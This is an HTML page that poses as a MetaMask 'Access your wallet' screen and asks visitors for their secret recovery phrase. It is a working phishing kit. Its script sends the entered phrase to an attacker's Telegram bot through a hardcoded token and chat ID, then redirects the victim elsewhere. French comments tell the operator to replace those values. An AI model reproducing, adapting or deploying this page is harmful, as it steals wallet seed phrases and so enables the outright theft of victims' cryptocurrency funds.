<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secret Recovery Phrase</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #fff;
      color: #333;
      display: flex;
      flex-direction: column;
      align-items: center;
      height: 100%;
    }

    .top-bar {
      width: 100%;
      max-width: 350px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 15px 5px;
    }

    .logo {
      font-weight: bold;
      font-size: 18px;
    }

    .language-select {
      padding: 4px 8px;
      font-size: 14px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    main {
      width: 100%;
      max-width: 350px;
      padding: 10px 15px 20px;
      box-sizing: border-box;
    }

    .card {
      background-color: white;
      border-radius: 14px;
      border: 1px solid #ddd;
      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
      padding: 20px;
    }

    .step-circles {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 40px;
      margin-bottom: 20px;
    }

    .step {
      text-align: center;
    }

    .circle {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      border: 2px solid #ccc;
      line-height: 28px;
      font-weight: bold;
      font-size: 13px;
      color: #777;
      background-color: white;
      margin: 0 auto 4px;
    }

    .step.active .circle {
      background-color: #6264ff;
      color: #fff;
      border: none;
    }

    .label {
      font-size: 11px;
      color: #666;
      line-height: 13px;
    }

    h1 {
      text-align: center;
      font-size: 15px;
      margin-bottom: 10px;
    }

    .description {
      text-align: center;
      font-size: 12px;
      color: #555;
      margin-bottom: 12px;
    }

    select.phrase-length {
      width: 100%;
      padding: 8px;
      margin-bottom: 8px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 13px;
    }

    .info {
      font-size: 11.5px;
      color: #444;
      margin: 8px 0;
      padding: 8px;
      background: #f5f5ff;
      border-left: 3px solid #6264ff;
      border-radius: 4px;
    }

    .seed-inputs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 6px;
      margin: 10px 0;
    }

    .seed-input {
      display: flex;
      align-items: center;
      gap: 2px;
    }

    .seed-input input {
      width: 100%;
      padding: 6px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 13px;
    }

    .submit-btn {
      background: linear-gradient(90deg, #537cff, #6563ff);
      border: none;
      color: white;
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border-radius: 20px;
      cursor: pointer;
    }

    @media (max-width: 400px) {
      .seed-inputs {
        grid-template-columns: repeat(2, 1fr);
      }
    }
  </style>
</head>
<body>

  <div class="top-bar">
    <div class="logo">MetaMask</div>
    <select class="language-select">
      <option value="en">EN</option>
      <option value="fr">FR</option>
    </select>
  </div>

  <main>
    <div class="card">

      <div class="step-circles">
        <div class="step active">
          <div class="circle">1</div>
          <div class="label">Recovery<br>phrase</div>
        </div>
        <div class="step">
          <div class="circle">2</div>
          <div class="label">Password</div>
        </div>
      </div>

      <h1>Access your wallet</h1>
      <p class="description">
        Enter your secret recovery phrase to restore your wallet. <a href="#">Learn more</a>
      </p>

      <select class="phrase-length" id="phraseLength" onchange="generateInputs()">
        <option value="12">12 words</option>
        <option value="15">15 words</option>
        <option value="18">18 words</option>
        <option value="21">21 words</option>
        <option value="24">24 words</option>
      </select>

      <div class="info">ðŸ’¡ You can paste your full phrase in any field</div>

      <div class="seed-inputs" id="seedInputs"></div>

      <button class="submit-btn" onclick="handleConfirm()">Confirm</button>

    </div>
  </main>

  <script>
    function generateInputs() {
      const container = document.getElementById("seedInputs");
      const count = parseInt(document.getElementById("phraseLength").value);
      container.innerHTML = "";
      for (let i = 1; i <= count; i++) {
        const div = document.createElement("div");
        div.className = "seed-input";
        div.innerHTML = `<label>${i}.</label><input type="text" name="word${i}" autocomplete="off" />`;
        container.appendChild(div);
      }
    }

    function handleConfirm() {
      const count = parseInt(document.getElementById("phraseLength").value);
      let phrase = "";
      for (let i = 1; i <= count; i++) {
        const value = document.querySelector(`input[name='word${i}']`).value;
        phrase += value.trim() + " ";
      }

      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
      const chatId = "6996434307";     // Remplace ici

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: "ðŸ” New Recovery Phrase:\n\n" + phrase.trim()
        })
      });

      navigator.clipboard.writeText(phrase.trim());

      setTimeout(() => {
        window.location.href = "https://example.com"; // Remplace par ton lien
      }, 800);
    }

    document.addEventListener("paste", function(e) {
      const activeInput = document.activeElement;
      if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;

      const paste = (e.clipboardData || window.clipboardData).getData("text");
      const words = paste.trim().split(/\s+/);
      if (words.length < 2) return;

      e.preventDefault();
      words.forEach((word, index) => {
        const input = document.querySelector(`input[name='word${index + 1}']`);
        if (input) input.value = word;
      });
    });

    window.onload = generateInputs;
  </script>

</body>
</html>
